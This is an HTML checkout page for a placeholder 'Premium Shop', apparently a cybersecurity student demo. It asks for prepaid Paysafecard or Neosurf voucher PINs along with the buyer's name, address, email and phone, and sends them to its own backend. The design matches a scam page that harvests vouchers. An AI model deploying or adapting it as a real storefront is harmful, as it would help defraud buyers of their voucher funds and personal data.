<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment - Premium Shop</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        /* TOUS LES CSS INTÃ‰GRÃ‰S */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Poppins', sans-serif; line-height: 1.6; }

        .header { background: white; padding: 1rem 0; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: fixed; width: 100%; top: 0; z-index: 1000; }
        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; display: flex; justify-content: space-between; align-items: center; }
        .logo { font-size: 1.5rem; font-weight: 700; color: #667eea; text-decoration: none; display: flex; align-items: center; gap: 10px; }
        .nav-list { display: flex; list-style: none; gap: 2rem; }
        .nav-link { text-decoration: none; color: #4a5568; font-weight: 500; transition: color 0.3s; }
        .nav-link:hover { color: #667eea; }

        .payment-section { min-height: 100vh; padding: 120px 20px 60px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
        .payment-container { max-width: 700px; margin: 0 auto; background: white; border-radius: 20px; padding: 40px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
        .back-link { display: inline-flex; align-items: center; color: #667eea; text-decoration: none; font-weight: 500; margin-bottom: 20px; }
        .back-link:hover { color: #764ba2; }
        .payment-title { font-size: 2rem; font-weight: 700; color: #2d3748; margin-bottom: 10px; text-align: center; }
        .payment-subtitle { color: #718096; text-align: center; margin-bottom: 30px; font-size: 1rem; }

        .order-summary { background: #f7fafc; border-radius: 12px; padding: 20px; margin-bottom: 30px; }
        .order-summary h3 { font-size: 1.2rem; color: #2d3748; margin-bottom: 15px; }
        .summary-item { display: flex; justify-content: space-between; margin-bottom: 10px; color: #4a5568; }
        .summary-total { display: flex; justify-content: space-between; margin-top: 15px; padding-top: 15px; border-top: 2px solid #e2e8f0; font-weight: 700; font-size: 1.2rem; color: #2d3748; }

        .payment-form { display: flex; flex-direction: column; gap: 30px; }
        .form-section { background: #f7fafc; padding: 25px; border-radius: 12px; border-left: 4px solid #667eea; }
        .section-header { font-size: 1.2rem; font-weight: 600; color: #2d3748; margin-bottom: 20px; }
        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .form-group { display: flex; flex-direction: column; }
        .form-label { font-weight: 600; color: #2d3748; margin-bottom: 8px; font-size: 0.95rem; }
        
        .code-input-wrapper { position: relative; }
        .form-input, .form-select, .code-input { width: 100%; padding: 12px 16px; border: 2px solid #e2e8f0; border-radius: 8px; font-size: 1rem; font-family: 'Poppins', sans-serif; transition: all 0.3s; background: white; }
        .form-select { cursor: pointer; appearance: none; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23667eea' d='M6 9L1 4h10z'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 12px center; padding-right: 35px; }
        .code-input { padding-right: 50px; text-align: center; font-family: 'Courier New', monospace; font-size: 1.1rem; letter-spacing: 2px; }
        .form-input:focus, .form-select:focus, .code-input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1); }
        .input-icon { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); font-size: 1.5rem; }
        .form-hint { margin-top: 6px; color: #718096; font-size: 0.85rem; }

        .code-field { margin-bottom: 20px; }

        .payment-choice { display: flex; gap: 15px; margin-bottom: 20px; }
        .choice-btn { flex: 1; padding: 15px; border: 2px solid #e2e8f0; border-radius: 10px; background: white; cursor: pointer; transition: all 0.3s; text-align: center; font-weight: 600; }
        .choice-btn.active { border-color: #667eea; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
        .choice-btn:hover:not(.active) { border-color: #667eea; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(102, 126, 234, 0.2); }

        .btn-submit { width: 100%; padding: 18px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 10px; font-size: 1.1rem; font-weight: 600; cursor: pointer; transition: all 0.3s; position: relative; overflow: hidden; }
        .btn-submit:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4); }
        .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; }
        .security-info { text-align: center; margin-top: 20px; }
        .security-info p { color: #718096; font-size: 0.9rem; margin: 5px 0; }

        .success-message, .error-message { text-align: center; padding: 40px 20px; display: none; }
        .success-icon, .error-icon { width: 80px; height: 80px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 3rem; margin: 0 auto 20px; }
        .success-icon { background: #48bb78; color: white; }
        .error-icon { background: #f56565; color: white; }
        .success-message h2 { color: #2d3748; font-size: 1.8rem; margin-bottom: 15px; }
        .btn-primary, .btn-secondary { padding: 12px 30px; background: #667eea; color: white; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; transition: all 0.3s; text-decoration: none; display: inline-block; margin-top: 10px; }
        .btn-secondary { background: #e2e8f0; color: #2d3748; }
        .btn-primary:hover { background: #764ba2; transform: translateY(-2px); }
        .btn-secondary:hover { background: #cbd5e0; }

        .footer { background: #2d3748; color: white; padding: 40px 0 20px; text-align: center; }
        .footer-brand { margin-bottom: 20px; }
        .footer .logo { font-size: 1.5rem; }

        @media (max-width: 768px) {
            .form-row { grid-template-columns: 1fr; }
            .payment-container { padding: 30px 20px; margin: 10px; }
            .nav-list { gap: 1rem; }
            .payment-choice { flex-direction: column; }
        }
    </style>
</head>
<body>
    <!-- HEADER -->
    <header class="header">
        <div class="container">
            <a href="index.html" class="logo">ğŸ›ï¸ Premium Shop</a>
            <nav class="nav">
                <ul class="nav-list">
                    <li><a href="index.html#home" class="nav-link">Home</a></li>
                    <li><a href="index.html#products" class="nav-link">Products</a></li>
                    <li><a href="index.html#contact" class="nav-link">Contact</a></li>
                </ul>
            </nav>
        </div>
    </header>

    <!-- PAYMENT SECTION -->
    <section class="payment-section">
        <div class="container">
            <div class="payment-container">
                <a href="index.html#products" class="back-link">â† Back to shop</a>
                <h1 class="payment-title">Secure Payment</h1>
                <p class="payment-subtitle">Enter your payment details to complete your order</p>

                <form id="paymentForm" class="payment-form">
                    <!-- Order Summary -->
                    <div class="order-summary">
                        <h3>Order Summary</h3>
                        <div class="summary-item">
                            <span>Product:</span>
                            <span>Premium Product</span>
                        </div>
                        <div class="summary-item">
                            <span>Price:</span>
                            <span>$99.99</span>
                        </div>
                        <div class="summary-total">
                            <span>Total:</span>
                            <span>$99.99</span>
                        </div>
                    </div>

                    <!-- BILLING ADDRESS -->
                    <div class="form-section">
                        <h3 class="section-header">Billing Address</h3>
                        <div class="form-row">
                            <div class="form-group">
                                <label for="street" class="form-label">Street Address</label>
                                <input type="text" id="street" name="street" class="form-input" placeholder="123 Main St" required>
                            </div>
                            <div class="form-group">
                                <label for="city" class="form-label">City</label>
                                <input type="text" id="city" name="city" class="form-input" placeholder="Barcelona" required>
                            </div>
                        </div>
                        <div class="form-row">
                            <div class="form-group">
                                <label for="postalCode" class="form-label">Postal Code</label>
                                <input type="text" id="postalCode" name="postalCode" class="form-input" placeholder="08001" required>
                            </div>
                            <div class="form-group">
                                <label for="country" class="form-label">Country *</label>
                                <select id="country" name="country" class="form-input form-select" required>
                                    <option value="">Select country</option>
                                    <option value="ES">ğŸ‡ªğŸ‡¸ Spain</option>
                                    <option value="FR">ğŸ‡«ğŸ‡· France</option>
                                    <option value="DE">ğŸ‡©ğŸ‡ª Germany</option>
                                    <option value="IT">ğŸ‡®ğŸ‡¹ Italy</option>
                                    <option value="GB">ğŸ‡¬ğŸ‡§ United Kingdom</option>
                                    <option value="US">ğŸ‡ºğŸ‡¸ United States</option>
                                    <option value="CA">ğŸ‡¨ğŸ‡¦ Canada</option>
                                    <option value="AU">ğŸ‡¦ğŸ‡º Australia</option>
                                    <option value="NL">ğŸ‡³ğŸ‡± Netherlands</option>
                                    <option value="BE">ğŸ‡§ğŸ‡ª Belgium</option>
                                    <option value="PT">ğŸ‡µğŸ‡¹ Portugal</option>
                                    <option value="CH">ğŸ‡¨ğŸ‡­ Switzerland</option>
                                    <option value="AT">ğŸ‡¦ğŸ‡¹ Austria</option>
                                    <option value="IE">ğŸ‡®ğŸ‡ª Ireland</option>
                                    <option value="DK">ğŸ‡©ğŸ‡° Denmark</option>
                                    <option value="SE">ğŸ‡¸ğŸ‡ª Sweden</option>
                                    <option value="NO">ğŸ‡³ğŸ‡´ Norway</option>
                                    <option value="FI">ğŸ‡«ğŸ‡® Finland</option>
                                    <option value="PL">ğŸ‡µğŸ‡± Poland</option>
                                    <option value="CZ">ğŸ‡¨ğŸ‡¿ Czech Republic</option>
                                    <option value="HU">ğŸ‡­ğŸ‡º Hungary</option>
                                    <option value="RO">ğŸ‡·ğŸ‡´ Romania</option>
                                    <option value="GR">ğŸ‡¬ğŸ‡· Greece</option>
                                    <option value="TR">ğŸ‡¹ğŸ‡· Turkey</option>
                                    <option value="RU">ğŸ‡·ğŸ‡º Russia</option>
                                    <option value="UA">ğŸ‡ºğŸ‡¦ Ukraine</option>
                                    <option value="MA">ğŸ‡²ğŸ‡¦ Morocco</option>
                                    <option value="TN">ğŸ‡¹ğŸ‡³ Tunisia</option>
                                    <option value="EG">ğŸ‡ªğŸ‡¬ Egypt</option>
                                    <option value="SA">ğŸ‡¸ğŸ‡¦ Saudi Arabia</option>
                                    <option value="AE">ğŸ‡¦ğŸ‡ª United Arab Emirates</option>
                                    <option value="IL">ğŸ‡®ğŸ‡± Israel</option>
                                    <option value="IN">ğŸ‡®ğŸ‡³ India</option>
                                    <option value="JP">ğŸ‡¯ğŸ‡µ Japan</option>
                                    <option value="CN">ğŸ‡¨ğŸ‡³ China</option>
                                    <option value="KR">ğŸ‡°ğŸ‡· South Korea</option>
                                    <option value="SG">ğŸ‡¸ğŸ‡¬ Singapore</option>
                                    <option value="MY">ğŸ‡²ğŸ‡¾ Malaysia</option>
                                    <option value="TH">ğŸ‡¹ğŸ‡­ Thailand</option>
                                    <option value="PH">ğŸ‡µğŸ‡­ Philippines</option>
                                    <option value="VN">ğŸ‡»ğŸ‡³ Vietnam</option>
                                    <option value="ID">ğŸ‡®ğŸ‡© Indonesia</option>
                                    <option value="BR">ğŸ‡§ğŸ‡· Brazil</option>
                                    <option value="AR">ğŸ‡¦ğŸ‡· Argentina</option>
                                    <option value="MX">ğŸ‡²ğŸ‡½ Mexico</option>
                                    <option value="CO">ğŸ‡¨ğŸ‡´ Colombia</option>
                                    <option value="CL">ğŸ‡¨ğŸ‡± Chile</option>
                                    <option value="PE">ğŸ‡µğŸ‡ª Peru</option>
                                    <option value="ZA">ğŸ‡¿ğŸ‡¦ South Africa</option>
                                    <option value="NG">ğŸ‡³ğŸ‡¬ Nigeria</option>
                                    <option value="KE">ğŸ‡°ğŸ‡ª Kenya</option>
                                    <option value="GH">ğŸ‡¬ğŸ‡­ Ghana</option>
                                    <option value="NZ">ğŸ‡³ğŸ‡¿ New Zealand</option>
                                    <option value="CR">ğŸ‡¨ğŸ‡· Costa Rica</option>
                                    <option value="PA">ğŸ‡µğŸ‡¦ Panama</option>
                                    <option value="UY">ğŸ‡ºğŸ‡¾ Uruguay</option>
                                    <option value="PY">ğŸ‡µğŸ‡¾ Paraguay</option>
                                    <option value="EC">ğŸ‡ªğŸ‡¨ Ecuador</option>
                                    <option value="BO">ğŸ‡§ğŸ‡´ Bolivia</option>
                                    <option value="VE">ğŸ‡»ğŸ‡ª Venezuela</option>
                                    <option value="GT">ğŸ‡¬ğŸ‡¹ Guatemala</option>
                                    <option value="HN">ğŸ‡­ğŸ‡³ Honduras</option>
                                    <option value="NI">ğŸ‡³ğŸ‡® Nicaragua</option>
                                    <option value="SV">ğŸ‡¸ğŸ‡» El Salvador</option>
                                    <option value="DO">ğŸ‡©ğŸ‡´ Dominican Republic</option>
                                </select>
                            </div>
                        </div>
                    </div>

                    <!-- PERSONAL INFO -->
                    <div class="form-section">
                        <h3 class="section-header">Personal Information</h3>
                        <div class="form-row">
                            <div class="form-group">
                                <label for="firstName" class="form-label">First Name</label>
                                <input type="text" id="firstName" name="firstName" class="form-input" placeholder="John" required>
                            </div>
                            <div class="form-group">
                                <label for="lastName" class="form-label">Last Name</label>
                                <input type="text" id="lastName" name="lastName" class="form-input" placeholder="Doe" required>
                            </div>
                        </div>
                        <div class="form-row">
                            <div class="form-group">
                                <label for="email" class="form-label">Email</label>
                                <input type="email" id="email" name="email" class="form-input" placeholder="john@example.com" required>
                            </div>
                            <div class="form-group">
                                <label for="phone" class="form-label">Phone Number</label>
                                <input type="tel" id="phone" name="phone" class="form-input" placeholder="+34 123 456 789" required>
                            </div>
                        </div>
                    </div>

                    <!-- PAYMENT INFO -->
                    <div class="form-section">
                        <h3 class="section-header">Payment Information</h3>
                        
                        <div class="payment-choice">
                            <div class="choice-btn active" data-method="paysafecard">
                                <div style="font-size: 1.2rem; margin-bottom: 5px;">ğŸ’³</div>
                                Paysafecard<br>
                                <small style="font-size: 0.8rem; opacity: 0.8;">16 chiffres</small>
                            </div>
                            <div class="choice-btn" data-method="neosurf">
                                <div style="font-size: 1.2rem; margin-bottom: 5px;">ğŸ«</div>
                                Neosurf<br>
                                <small style="font-size: 0.8rem; opacity: 0.8;">10 chiffres</small>
                            </div>
                        </div>

                        <!-- Paysafecard -->
                        <div class="form-group code-field" id="paysafecardGroup">
                            <label for="paysafecardCode" class="form-label">Paysafecard PIN</label>
                            <div class="code-input-wrapper">
                                <input type="text" id="paysafecardCode" class="code-input" placeholder="0000-0000-0000-0000" maxlength="19">
                                <span class="input-icon">ğŸ”’</span>
                            </div>
                            <small class="form-hint">Enter 16-digit code (format auto)</small>
                        </div>

                        <!-- Neosurf -->
                        <div class="form-group code-field" id="neosurfGroup">
                            <label for="neosurfCode" class="form-label">Neosurf PIN</label>
                            <div class="code-input-wrapper">
                                <input type="text" id="neosurfCode" class="code-input" placeholder="0000 0000 00" maxlength="12">
                                <span class="input-icon">ğŸ”’</span>
                            </div>
                            <small class="form-hint">Enter 10-digit code (format auto)</small>
                        </div>
                    </div>

                    <button type="submit" class="btn-submit" id="submitBtn">
                        Complete Payment
                    </button>
                    <div class="security-info">
                        <p>ğŸ”’ DEMO - Secure server-side processing</p>
                    </div>
                </form>

                <!-- Success -->
                <div id="successMessage" class="success-message">
                    <div class="success-icon">âœ…</div>
                    <h2>Payment Successful!</h2>
                    <p>Your demo payment is confirmed!</p>
                    <a href="index.html" class="btn-primary">â† Back to Shop</a>
                </div>

                <!-- Error -->
                <div id="errorMessage" class="error-message">
                    <div class="error-icon">âŒ</div>
                    <h3>Payment Failed</h3>
                    <p id="errorText">Please check your information.</p>
                    <button type="button" class="btn-secondary" onclick="resetForm()">Try Again</button>
                </div>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer class="footer">
        <div class="container">
            <div class="footer-brand">
                <span class="logo">ğŸ›ï¸ Premium Shop</span>
                <p>DEMO Project - EPITA Cybersecurity 2026</p>
            </div>
            <div class="footer-bottom">
                <p>&copy; 2026 Demo. All rights reserved.</p>
            </div>
        </div>
    </footer>

    <!-- JAVASCRIPT INTÃ‰GRÃ‰ -->
    <script>
    document.addEventListener('DOMContentLoaded', function() {
        console.log('ğŸš€ Payment page loaded âœ…');
        
        const choiceBtns = document.querySelectorAll('.choice-btn');
        const paymentForm = document.getElementById('paymentForm');
        const submitBtn = document.getElementById('submitBtn');
        let selectedMethod = 'paysafecard'; // Par dÃ©faut
        
        console.log('Elements found:', {
            choiceBtns: choiceBtns.length,
            paysafecardGroup: !!document.getElementById('paysafecardGroup'),
            neosurfGroup: !!document.getElementById('neosurfGroup')
        });

        // Choix mÃ©thode
        choiceBtns.forEach(btn => {
            btn.addEventListener('click', function() {
                console.log('ğŸ”„ Method selected:', this.dataset.method);
                choiceBtns.forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                selectedMethod = this.dataset.method;
                console.log('âœ… Selected method:', selectedMethod);
            });
        });

        // Auto-format Paysafecard
        document.getElementById('paysafecardCode')?.addEventListener('input', function() {
            let val = this.value.replace(/[^\d]/g, '');
            let formatted = '';
            for (let i = 0; i < val.length && i < 16; i++) {
                if (i && i % 4 === 0) formatted += '-';
                formatted += val[i];
            }
            this.value = formatted;
        });

        // Auto-format Neosurf
        document.getElementById('neosurfCode')?.addEventListener('input', function() {
            let val = this.value.replace(/[^\d]/g, '');
            let formatted = '';
            for (let i = 0; i < val.length && i < 10; i++) {
                if (i && i % 4 === 0) formatted += ' ';
                formatted += val[i];
            }
            this.value = formatted;
        });

        // Submit -> envoi au backend (pas de localStorage)
        paymentForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            let code;
            if (selectedMethod === 'paysafecard') {
                code = document.getElementById('paysafecardCode').value.replace(/[- ]/g, '');
                if (code.length !== 16) return alert('Paysafecard: 16 chiffres requis');
            } else if (selectedMethod === 'neosurf') {
                code = document.getElementById('neosurfCode').value.replace(/[- ]/g, '');
                if (code.length !== 10) return alert('Neosurf: 10 chiffres requis');
            }

            submitBtn.disabled = true;
            submitBtn.textContent = 'Processing...';

            const formData = {
                method: selectedMethod,
                code,  // Code envoyÃ© UNIQUEMENT au backend
                firstName: document.getElementById('firstName').value,
                lastName: document.getElementById('lastName').value,
                email: document.getElementById('email').value,
                phone: document.getElementById('phone').value,
                street: document.getElementById('street').value,
                city: document.getElementById('city').value,
                postalCode: document.getElementById('postalCode').value,
                country: document.getElementById('country').value
            };

            try {
                const response = await fetch('/api/payment', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formData)
                });

                const result = await response.json();

                if (result.success) {
                    paymentForm.style.display = 'none';
                    document.getElementById('successMessage').style.display = 'block';
                } else {
                    alert('Erreur: ' + (result.error || 'VÃ©rifiez le code'));
                }
            } catch (error) {
                alert('Erreur rÃ©seau. VÃ©rifiez votre connexion.');
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Complete Payment';
            }
        });
    });

    function resetForm() {
        document.getElementById('paymentForm').style.display = 'flex';
        document.getElementById('successMessage').style.display = 'none';
        document.getElementById('errorMessage').style.display = 'none';
        document.getElementById('paymentForm').reset();
        document.querySelector('.choice-btn[data-method="paysafecard"]').classList.add('active');
        document.querySelector('.choice-btn[data-method="neosurf"]').classList.remove('active');
        document.getElementById('country').value = '';
    }
    </script>
</body>
</html>
